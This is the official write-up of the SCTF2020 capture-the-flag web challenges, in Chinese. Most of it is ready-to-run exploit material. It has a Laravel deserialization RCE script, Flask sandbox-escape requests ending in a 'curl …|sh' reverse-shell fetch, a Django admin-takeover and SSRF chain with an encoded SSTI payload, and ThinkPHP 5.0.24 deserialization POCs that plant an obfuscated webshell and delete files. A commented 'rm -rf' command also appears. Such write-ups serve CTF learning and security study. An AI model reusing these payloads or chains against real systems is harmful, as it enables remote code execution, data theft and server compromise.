# SCTF2020 官方Write-up
源码和Wp已开源

Github：https://github.com/SycloverSecurity/SCTF2020
[TOC]
## Web

### CloudDisk
首先题目给了源码，uploadfile的处理逻辑如下:
```javascript=
router.post('/uploadfile', async (ctx, next) => {
    const file = ctx.request.body.files.file;
    const reader = fs.createReadStream(file.path);
    let fileId = crypto.createHash('md5').update(file.name + Date.now() + SECRET).digest("hex");
    let filePath = path.join(__dirname, 'upload/') + fileId
    const upStream = fs.createWriteStream(filePath);
    reader.pipe(upStream)
    return ctx.body = "Upload success ~, your fileId is here：" + fileId;
  });
```
审计一会儿会发现从 `ctx.request.body` 取文件对象用的是koa-body的老版本的写法，于是我写了一个demo，把每个请求的 `ctx.request.body` 给打印出来，我们会发现对于文件对象，koa-body2.x版本会处理成这样的格式
![](https://i.loli.net/2020/07/08/nKrYWl9FkvjIeLH.png)
就像和post一条json一样
再参考这条issue
`https://github.com/dlau/koa-body/issues/75`
我们就能轻松构造出payload
```
{"files":{"file":{"path":"/proc/self/cwd/flag","name":"1"}}}
```
![](https://i.loli.net/2020/07/08/XrAVlvMJipctOzx.png)

![](https://i.loli.net/2020/07/08/7sO4lkLSB3v5KaW.png)


### Bestlanguage


#### 非预期
laravel 低版本CVE-2018-15133，直接反序列化RCE了，出题人心态炸裂

#### 预期

此题来源于真实业务改编


#### 写文件
Docker/app/app/Http/Controllers/IndexController.php
第一步的考点是写文件，估计大部分人访问upload接口都是500
因为file_put_contents是不能跨目录新建文件的
```php
public function upload()
{

    if(strpos($_POST["filename"], '../') !== false) die("???");
    file_put_contents("/var/tmp/".md5($_SERVER["REMOTE_ADDR"])."/".$_POST["filename"],base64_decode($_POST["content"]));
    echo "/var/tmp/".md5($_SERVER["REMOTE_ADDR"])."/".$_POST["filename"];
}
```
由于init目录只能内网访问，md5($_SERVER["REMOTE_ADDR"])这个目录是不存在的，所以file_put_contents无法写成功
返回会一直500，这个本地搭建开debug就能发现

第一个考点就是如何让文件落地，file_put_contents有个trick，如果写入的文件名是xxxxx/.
那么/.会被忽略，会直接写入xxxxx文件

所以我们传入filename=.
即可在/var/tmp下生成md5($_SERVER["REMOTE_ADDR"])文件
#### move
文件落地以后就可以通过move/log路由对文件进行移动了
```php
public function moveLog($filename)
{

    $data =date("Y-m-d");
    if(!file_exists(storage_path("logs")."/".$data)){
        mkdir(storage_path("logs")."/".$data);
    }
    $opts = array(
        'http'=>array(
            'method'=>"GET",
            'timeout'=>1,//单位秒
        )
    );

    $content = file_get_contents("http://127.0.0.1/tmp/".md5('127.0.0.1')."/".$filename,false,stream_context_create($opts));
    file_put_contents(storage_path("logs")."/".$data."/".$filename,$content);
    echo storage_path("logs")."/".$data."/".$filename;
}
```
首先讲一个坑
```php
Route::get('/tmp/{filename}', function ($filename) {
    readfile("/var/tmp/".$filename);
})->where('filename', '(.*)');
```
这个路由是读不到flag的，因为nginx会对路径进行判断，如果输入的../超过了根目录，那么会直接返回400

| 请求路径                       | 状态码    | 
| --------                      | -----   | 
| GET /../ HTTP/1.1             | 400      |  
| GET /123123/../                | 200      |  
| GET /%2e%2e%2f                  | 400      | 
| GET /123123/3123123/../          | 200      | 
| GET /123123/3123123/../../       | 200      | 
| GET /123123/3123123/../../../     | 400      | 

这个是nginx的判断，所以无法../跳到根目录

好，那movelog函数能做什么
他会去请求 `http://127.0.0.1/tmp/".md5('127.0.0.1')."/".$filename`
然后把返回结果写入
```php
$data =date("Y-m-d");
file_put_contents(storage_path("logs")."/".$data."/".$filename,$content);
```


我们可以输入 `?filename=../${md5(ip)}` 访问到我们的文件
然后会写入到log目录下
由于上面我们虽然让文件落地了，但是文件名是md5 ip，不可控，但是我们可以通过url和路径的差异，用？或者#截断
所以输入 ../${md5(ip)}?/../../abcd
即可将我们落地的文件移动到任意目录下的任意文件名

当然这里还是受nginx影响，我们只能在storage里面任意写入文件

然而laravel的session也存在在storage目录里，我们直接覆盖session文件进行反序列化
本题用的laravel 5.5.39，phpggc里就有现成的反序列化链

laravel的session文件名不是常规的SESS_sessid，所以我放出了APP_KEY，本地搭建即可看到session文件名，
与远程是一样的

exp.py可以直接打获取flag(没有一个人用预期做的，心态崩了，随便写写wp
```python
import requests
import os
import base64
import urllib.request
import re

remote_ip = "39.104.19.182" #题目ip
md5_ip = "e4cfc06ac6f1336028e43916cf1d75d3"    #你自己的ip md5
phpggc_data = base64.b64encode(os.popen('php phpggc Laravel/RCE4 system "cat /flag"').read().encode("utf8"))



paramsPost = {"filename": "tmp/" + md5_ip}
headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
           "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
           "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
           "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded"}
cookies = {"sessionid": "8k648uvlg2brp93id13fq0vvy6jaticd1",
           "csrftoken": "anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv",
           "laravel_session": "eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.post("http://" + remote_ip + "/rm", data=paramsPost, headers=headers, cookies=cookies)

print("clear file")
print("Response body: %s" % response.content)


paramsPost = {"content":phpggc_data,"filename":"."}
headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
cookies = {"sessionid":"8k648uvlg2brp93id13fq0vvy6jaticd1","csrftoken":"anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv","laravel_session":"eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.post("http://"+remote_ip+"/upload", data=paramsPost, headers=headers, cookies=cookies)

print("upload file")
print("Response body: %s" % response.content)

response = urllib.request.urlopen("http://"+remote_ip+"/move/log/../"+md5_ip+"%3f/../../framework/sessions/BDDLh0HsqaXe54sPFUuzMT7azrLUC9JGtw1SNdZV")
print("move file")
print("Response body: %s" % response.read().decode('utf-8'))

headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Cache-Control":"max-age=0","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate"}
cookies = {"sessionid":"8k648uvlg2brp93id13fq0vvy6jaticd1","csrftoken":"anYz8P4YYYwqB7yhFfPztk5rfp97qaBzzwtUeCswsfWroUzNgiD58QzbKE6OT2Dv","laravel_session":"eyJpdiI6ImVmbllpOGtVeXQxQjZ4cXFEM3k0eXc9PSIsInZhbHVlIjoidVNvTWNocGp4cEdPdG5rWXVEVFdIb0UzRG5KcThxTk5uU3lKdjFXbzRMdXlHUkVrcFNtV0ZRa1JUYUhSUXJrSlduZHU1MDJWZUZVaG1qODFxRjJoakE9PSIsIm1hYyI6ImYyZTQ3ZmZkNDRlYjQ5MGY2OGUzMzM1NjlkYTZjOTc1MGUzZGQyMWIwYTBkYzgyNmUyNjA5NTJjNWU0NGE1YzMifQ%3D%3D"}
response = requests.get("http://"+remote_ip+"/tmp/123", headers=headers, cookies=cookies)

print("exploit success!")
res = response.content.decode("utf-8")
print(re.search(r"(.*)<!DOCTYPE html>",res,re.S).group(1))

```
### Pysandbox

#### 非预期
通过app.static_folder 动态更改静态文件目录，将静态文件目录设为根目录，从而任意文件读,这也是pysandbox的大部分做法
#### 预期
预期就是pysandbox2 必须RCE

本题的主要思路就是劫持函数，通过替换某一个函数为eval system等，然后变量外部可控，即可RCE
看了一下大家RCE的做法都不相同，但只要是劫持都算在预期内，只是链不一样，这里就只贴一下自己当时挖到的方法了

首先要找到一个合适的函数，满足参数可控，最终找到werkzeug.urls.url_parse这个函数，参数就是HTTP包的路径

比如
```
GET /index.php HTTP/1.1
Host: xxxxxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
```
参数就是 '/index.php'
然后是劫持，我们无法输入任何括号和空格，所以无法直接import werkzeug
需要通过一个继承链关系来找到werkzeug这个类
直接拿出tokyowestern 2018年 shrine的找继承链脚本（https://eviloh.github.io/2018/09/03/TokyoWesterns-2018-shrine-writeup/)
访问一下，即可在1.txt最下面看到继承链
最终找到是
`request.__class__._get_current_object.__globals__['__loader__'].__class__.__weakref__.__objclass__.contents.__globals__['__loader__'].exec_module.__globals__['_bootstrap_external']._bootstrap.sys.modules['werkzeug.urls']
`
但是发现我们不能输入任何引号，这个考点也考多了，可以通过request的属性进行bypass
一些外部可控的request属性
request.host
request.content_md5
request.content_encoding
所以请求1
```
POST / HTTP/1.1
Host: __loader__
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: experimentation_subject_id=IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang=zh-CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-MD5: _bootstrap_external
Content-Encoding: werkzeug.urls
Content-Type: application/x-www-form-urlencoded
Content-Length: 246

cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval
```
然后url_parse函数就变成了eval
然后访问第二个请求

```
POST __import__('os').system('curl${IFS}https://shell.now.sh/8.8.8.8:1003|sh') HTTP/1.1
Host: __loader__
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: experimentation_subject_id=IjA3OWUxNDU0LTdiNmItNDhmZS05N2VmLWYyY2UyM2RmZDEyMyI%3D--a3effd8812fc6133bcea4317b16268364ab67abb; lang=zh-CN
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-MD5: _bootstrap_external
Content-Encoding: werkzeug.urls
Content-Type: application/x-www-form-urlencoded
Content-Length: 246

cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval
```
shell就弹回来了
### Jsonhub

源码审计，预期是 成为Django-admin -> 利用CVE-2018-14574 造成SSRF打flask_rpc -> UTF16或者unicode绕过 {{限制 -> 无字母SSTI
由于写的太急了忘记限制symbols为一个字符，非预期是直接利用symbols绕过

#### 预期
#### 成为admin
```python
def reg(request):
    if request.method == "GET":
        return render(request, "templates/reg.html")
    elif request.method == "POST":
        try:
            data = json.loads(request.body)
        except ValueError:
            return JsonResponse({"code": -1, "message": "Request data can't be unmarshal"})

        if len(User.objects.filter(username=data["username"])) != 0:
            return JsonResponse({"code": 1})
        User.objects.create_user(**data)
        return JsonResponse({"code": 0})
```
可以看到把json对象全部传入了create_user，这是python的一个语法，会把字典元素变为键值对作为函数参数，本意是方便开发
比如{"username":"admin", "password":"123456"} 即是 User.objects.create_user(username="admin",password="123456")
所以我们可以传入恶意键值对，在注册的时候直接变为admin，查阅文档或者翻下django项目的数据库找到对应列名
{"username":"admin","password":"123456","is_staff":1,"is_superuser":1}
即可成为admin

```
POST /reg/ HTTP/1.1
Host: 192.168.15.133:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 70
Origin: http://192.168.15.133:8000
Connection: close
Referer: http://192.168.15.133:8000/reg/

{"username":"admin","password":"123456","is_staff":1,"is_superuser":1}
```
然后登入admin后台，获取token
#### CVE-2018-14574
Django < 2.0.8 存在任意URL跳转漏洞，我们可以通过这个来SSRF
由于path采用了re_path，我们只需要传入
http://39.104.19.182//8.8.8.8/login
即可跳转到任意url的login路由
```
POST /home/ HTTP/1.1
Host: 192.168.15.133:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=C1JAgkBIk8uqH9XF2CHBlsWDSPfOwNZHmj7RfnqqEdH1pqtPSvuNgxGNdodpZGta; sessionid=e8gd9dipyijy3t96hn5jujv1d0o90r0o
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

{"token":"xxxxxxxxxxxxxxxxxxxxxx","url":"http://39.104.19.182//8.8.8.8/login"}
```
由于python request库会自动跟随302
然后我们在自己的vps上搭一个服务，继续跳转到本地127.0.0.1:8000/flask_rpc
就可以SSRF访问flask_rpc开始打flask

#### UTF16 && unicode
```python
@app.before_request
def before_request():
    data = str(request.data)
    log()
    if "{{" in data or "}}" in data or "{%" in data or "%}" in data:
        abort(401)
```
flask做了一个简单的waf，不允许ssti的关键字符，需要bypass
此处有两个办法
```python
@app.route('/caculator', methods=["POST"])
def caculator():
    try:
        data = request.get_json()
```
但是flask获取参数的方式又是get_json方法，我们跟入一下
```python
    def get_json(self, force=False, silent=False, cache=True):
        """Parse :attr:`data` as JSON.

        If the mimetype does not indicate JSON
        (:mimetype:`application/json`, see :meth:`is_json`), this
        returns ``None``.

        If parsing fails, :meth:`on_json_loading_failed` is called and
        its return value is used as the return value.

        :param force: Ignore the mimetype and always try to parse JSON.
        :param silent: Silence parsing errors and return ``None``
            instead.
        :param cache: Store the parsed JSON to return for subsequent
            calls.
        """
        if cache and self._cached_json[silent] is not Ellipsis:
            return self._cached_json[silent]

        if not (force or self.is_json):
            return None

        data = self._get_data_for_json(cache=cache)

        try:
            rv = self.json_module.loads(data)
        except ValueError as e:
            if silent:
                rv = None

                if cache:
                    normal_rv, _ = self._cached_json
                    self._cached_json = (normal_rv, rv)
            else:
                rv = self.on_json_loading_failed(e)

                if cache:
                    _, silent_rv = self._cached_json
                    self._cached_json = (rv, silent_rv)
        else:
            if cache:
                self._cached_json = (rv, rv)

        return rv
```
看到`rv = self.json_module.loads(data)`继续跟入
```python
    @staticmethod
    def loads(s, **kw):
        if isinstance(s, bytes):
            # Needed for Python < 3.6
            encoding = detect_utf_encoding(s)
            s = s.decode(encoding)

        return _json.loads(s, **kw)
```
```python
def detect_utf_encoding(data):
    """Detect which UTF encoding was used to encode the given bytes.

    The latest JSON standard (:rfc:`8259`) suggests that only UTF-8 is
    accepted. Older documents allowed 8, 16, or 32. 16 and 32 can be big
    or little endian. Some editors or libraries may prepend a BOM.

    :internal:

    :param data: Bytes in unknown UTF encoding.
    :return: UTF encoding name

    .. versionadded:: 0.15
    """
    head = data[:4]

    if head[:3] == codecs.BOM_UTF8:
        return "utf-8-sig"

    if b"\x00" not in head:
        return "utf-8"

    if head in (codecs.BOM_UTF32_BE, codecs.BOM_UTF32_LE):
        return "utf-32"

    if head[:2] in (codecs.BOM_UTF16_BE, codecs.BOM_UTF16_LE):
        return "utf-16"

    if len(head) == 4:
        if head[:3] == b"\x00\x00\x00":
            return "utf-32-be"

        if head[::2] == b"\x00\x00":
            return "utf-16-be"

        if head[1:] == b"\x00\x00\x00":
            return "utf-32-le"

        if head[1::2] == b"\x00\x00":
            return "utf-16-le"

    if len(head) == 2:
        return "utf-16-be" if head.startswith(b"\x00") else "utf-16-le"

    return "utf-8"
```
可以看到flask的get_json方法会通过传入的body自动判断编码然后解码，这就与之前的waf存在一个差异
我们可以把exp进行UTF16编码然后bypass waf
另一个办法就是\u unicode字符进行绕过
#### bypass字母
好了{{我们已经可以bypass了，但是num还限制了不能有字母，这个怎么办
python里面，我们可以通过 '\123'来表示一个字符，我们就可以通过这个来bypass字母的限制
这个对应关系并不遵守Ascii，所以我们可以先遍历存入字典
```python
exp = "request"
dicc = []
exploit = ""
for i in range(256):
    eval("dicc.append('{}')".format("\\"+str(i)))
for i in exp:
    exploit += "\\\\"+ str(dicc.index(i))


print(exploit)
```
用这个脚本转换一下常规的SSTI

```python
data = r'''{"num1":"{{()['\\137\\137\\143\\154\\141\\163\\163\\137\\137']['\\137\\137\\142\\141\\163\\145\\163\\137\\137'][0]['\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137']()[155]['\\137\\137\\151\\156\\151\\164\\137\\137']['\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137']['\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137']['\\145\\166\\141\\154']('\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\160\\157\\160\\145\\156\\50\\47\\143\\141\\164\\40\\57\\145\\164\\143\\57\\160\\141\\163\\163\\167\\144\\47\\51\\56\\162\\145\\141\\144\\50\\51')}}","num2":1,"symbols":"+"}'''

print(data.encode("utf-16"))

```
把两个脚本结合一下
```python
from flask import Flask, request, render_template_string,redirect
import re
import json
import string,random
import base64
app = Flask(__name__)
from urllib.parse import quote


#exp = "__import__('os').popen('rm rf /*').read()"
#exp = "__import__('os').popen('cat /flag').read()"
exp = "__import__('os').popen('/readflag').read()"
dicc = []
exploit = ""
for i in range(256):
    eval("dicc.append('{}')".format("\\"+str(i)))
for i in exp:
    exploit += "\\\\"+ str(dicc.index(i))

@app.route('/login/')
def index():
    # data = r'''{"num1":"{{()['\\137\\137\\143\\154\\141\\163\\163\\137\\137']['\\137\\137\\142\\141\\163\\145\\163\\137\\137'][0]['\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137']()[155]['\\137\\137\\151\\156\\151\\164\\137\\137']['\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137']['\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137']['\\145\\166\\141\\154']('\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\160\\157\\160\\145\\156\\50\\47\\143\\141\\164\\40\\57\\145\\164\\143\\57\\160\\141\\163\\163\\167\\144\\47\\51\\56\\162\\145\\141\\144\\50\\51')}}","num2":1,"symbols":"+"}'''.encode("utf16")
    data = (r'''{"num1":"{{()['\\137\\137\\143\\154\\141\\163\\163\\137\\137']['\\137\\137\\142\\141\\163\\145\\163\\137\\137'][0]['\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137']()[64]['\\137\\137\\151\\156\\151\\164\\137\\137']['\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137']['\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137']['\\145\\166\\141\\154']('%s')}}","num2":1,"symbols":"+"}''' % exploit).encode("utf16")

    data = quote(base64.b64encode(data))
    return redirect("http://127.0.0.1:8000/rpc/?methods=POST&url=http%3a//127.0.0.1%3a5000/caculator&mime=application/json&data="+data)

if __name__ == '__main__':
    app.run(host="0.0.0.0",port=5000,debug=True)

```
vps上搭好后，向home路由请求一下自己的vps即可看到flag


### UnsafeDefenseSystem
这题出法本身属于比较偏实战的题目，题目环境也都是由实战渗透中改编而来，综合了前期的信息搜集，中期的代码审计，以及后期的实战渗透，大量的跳转模拟了实战中大量资产的统计，代码审计综合了Python与经典的Thinkphp5，实战渗透的细节决定了最后Getshell的问题。
根据赛题反馈情况来看，大部分选手采用了条件竞争的解法，这个属于预期解，不过没想到大家都在条件竞争，本题为了降低难度没有限制频率，实战环境正常来说是要结合频率限制的，另外Python脚本是本人朋友年轻时候写的不成熟代码，冗余代码（结合实际）审计起来的确挺恶心的，给大伙道个歉。
#### 信息搜集
访问链接/public，可以判断这属于tp5的系统结构
看到这个界面，发现该界面自动记录了访问者的ip，得到信息index.php，然后发现很快自动跳转到了localhost的public/test/，并且告诉了我们log.txt的存在
尝试点击各功能按钮，fuzz过后可以发现该界面属于纯html界面，没有功能，查看源代码
在源代码中发现提示，访问/public/nationalsb路由
发现一个登陆框，随便输入用户名密码，发现无发包，依然是纯html界面，在源代码中查看
在Js代码中发现了注释泄露的用户名密码信息
Admin1964752 DsaPPPP!@#amspe1221 login.php
401认证爆破，难点在于他没有拒绝认证，任何认证都会确认，每次删除认证头爆破密码。
如果输入错误的认证，会发现只有普通的信息，没有任何可用的点。
正确后获得一个$file的文件读取
尝试读取flag，发现无回显，很奇怪，猜测是ban了flag关键字
读取源代码，分别读取login.php，上一层目录的index.php，还有上一层的think文件
了解到是tp5.0.24
存在已知的反序列化rce漏洞
在文件读取中
读取application/index/controller/Index.php
发现反序列化入口点
thinkphp5.0.24反序列化rce漏洞参考：https://www.anquanke.com/post/id/196364
通过该点触发后，将会写马进入web目录，但是每次写马都会被删除，猜测有防御手段，这里是本题的精髓点，在实战中，经常有各种第三方防护手段，本题目的防御手段为一个Python的文件守护，需要通过逻辑漏洞导致该程序崩溃，然后才能写马。
在/public/log.txt中
提示文件存在protect.py
通过之前的文件读取获得protect.py的源代码
![](https://i.loli.net/2020/07/08/CuD41SRIUxKHJGN.png)
#### 代码审计
这部分参考了osword师傅的代码审计过程，感兴趣的可以学习一波
然后分析protect.py文件，该文件源码较长，代码逻辑混乱，需要较长时间的审计过程。
![](https://i.loli.net/2020/07/08/v9nZDfLqPaxJe28.png)
涉及函数
![](https://i.loli.net/2020/07/08/7N1RYVZJwadfjDE.png)
目录缺失修复
![](https://i.loli.net/2020/07/08/e1HiEbGoP37fUV2.png)
文件增改修复
![](https://i.loli.net/2020/07/08/B4Y3PCMUqcub9ZW.png)
文件删除修复
![](https://i.loli.net/2020/07/08/8ycWrxzYtQOjCS6.png)
关键点如上，该部分代码存在一个文件流漏洞，高频的访问日志文件，导致文件流高频开启关闭，同时该部分代码没有用try except保护，这导致文件被删除后，该程序会抛出一个报错导致崩溃。
这里使用一个tp5.0.24的任意文件删除poc删除文件导致防御脚本崩溃
所有poc贴在最后
#### 获取flag
需要文件读取中获取的index.php源码了解到反序列化点为
![](https://i.loli.net/2020/07/08/XwGclMVETi83d51.png)
此处需要用一个base64加密过的poc进行反序列化
触发index/hello函数
触发方式为
http://127.0.0.1/public/index.php/index/index/hello?s3cr3tk3y
即可触发
同时要注意的点为，该反序列化poc需要用到php的短标签，如果该处未开启，该poc写的木马将无法运行
Poc如下:
delete_file.php:
```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
private $files = [];
public function __construct()
{
$this->files=['router.php'];
}
}
echo base64_encode(serialize(new Windows()));
```
这里注意，防御脚本不检测任何txt文件，删除一个其他后缀名文件即可。
POC：
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjEwOiJyb3V0ZXIucGhwIjt9fQ==
poc.php
```php
<?php
namespace think\process\pipes{
    class Windows{
        private $files = [];
        function __construct($a){
            $this->files=[$a];
        }
    }
}
namespace think{
    abstract class Model{
}
}
namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public $parent;
        protected $append = [];
        protected $data = [];
        protected $error;
        function __construct($parent,$error){
            $this->parent=$parent;
            $this->append = ["getError"];
            $this->data =['123'];
            $this->error=(new model\relation\HasOne($error));
        }
    }
   
}
namespace think\model\relation{
    use think\model\Relation;
    class HasOne extends OneToOne{
       
    }
}
namespace think\mongo{
    class Connection{
    }
}
namespace think\model\relation{
    abstract class OneToOne{
        protected $selfRelation;
        protected $query;
        protected $bindAttr = [];
        function __construct($query){
            $this->selfRelation=0;
            $this->query=$query;
            $this->bindAttr=['123'];
        }
    }
    }
namespace think\console{
    class Output{
        private $handle = null;
        protected $styles = [
            'getAttr'
        ];
        function __construct($handle){
            $this->handle=$handle;
        }
    }
}
namespace think\session\driver{
    class Memcached{
        protected $handler = null;
        function __construct($handle){
            $this->handler=$handle;
        }
    }
   
}
namespace think\cache\driver
{
    class File{
        protected $options = [
            'expire'        => 3600,
            'cache_subdir'  => false,#encode
            'prefix'        => '',#convert.quoted-printable-decode|convert.quoted-printable-decode|convert.base64-decode/
            'path'          => 'php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=?<hp pn$ma=e_$EG[Tf"li"e;]f$li=e_$EG[Td"wo"n;]ifelp_tuc_noettn(sn$ma,eifelg_tec_noettn(sf$li)e;)ihhgilhg_tifel_(F_LI_E)_?;a>a/../',
            'data_compress' => false,
        ];
        protected $tag='123';
    }
}
namespace think\db{
    class Query{
        protected $model;
        function __construct($model){
            $this->model=$model;
        }
    }
}
namespace{
    $File = (new think\cache\driver\File());
    $Memcached = new think\session\driver\Memcached($File);
    $query = new think\db\Query((new think\console\Output($Memcached)));
    $windows=new think\process\pipes\Windows((new think\model\Pivot((new think\console\Output($Memcached)),$query)));
    echo base64_encode((serialize($windows)));
}
?>
```
POC
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjM2MDA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MTgyOiJwaHA6Ly9maWx0ZXIvL2NvbnZlcnQuaWNvbnYuVUNTLTJMRS5VQ1MtMkJFL3Jlc291cmNlPT88aHAgcG4kbWE9ZV8kRUdbVGYibGkiZTtdZiRsaT1lXyRFR1tUZCJ3byJuO11pZmVscF90dWNfbm9ldHRuKHNuJG1hLGVpZmVsZ190ZWNfbm9ldHRuKHNmJGxpKWU7KWloaGdpbGhnX3RpZmVsXyhGX0xJX0UpXz87YT5hLy4uLyI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czozOiIxMjMiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX1zOjk6IgAqAGFwcGVuZCI7YToxOntpOjA7czo4OiJnZXRFcnJvciI7fXM6NzoiACoAZGF0YSI7YToxOntpOjA7czozOiIxMjMiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGl